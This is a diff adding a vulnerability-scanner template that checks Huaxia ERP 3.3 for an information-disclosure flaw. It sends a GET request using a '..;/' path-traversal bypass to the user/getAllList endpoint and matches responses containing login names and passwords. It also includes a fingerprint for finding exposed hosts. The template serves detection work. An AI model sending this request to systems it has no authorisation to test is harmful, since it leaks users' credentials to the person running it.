@@ -1,0 +1,15 @@
+id: poc-yaml-huaxia-erp-getalllist-information-disclosure
+info:
+  name: 华夏ERP3.3 getAllList 信息泄漏漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 华夏ERP
+  hunter: web.icon=="f6efcd53ba2b07d67ab993073c238a11"
+requests:
+- method: GET
+  path: /jshERP-boot/platformConfig/getPlatform/..;/..;/..;/jshERP-boot/user/getAllList
+  expression: status_code == 200 && contains(body,"loginName") && contains(body,"password")
+    && contains(body,"{\"code\":200,\"data\":{\"userList\"") && contains(content_type,"application/json")
+variables: {}
+transport: http
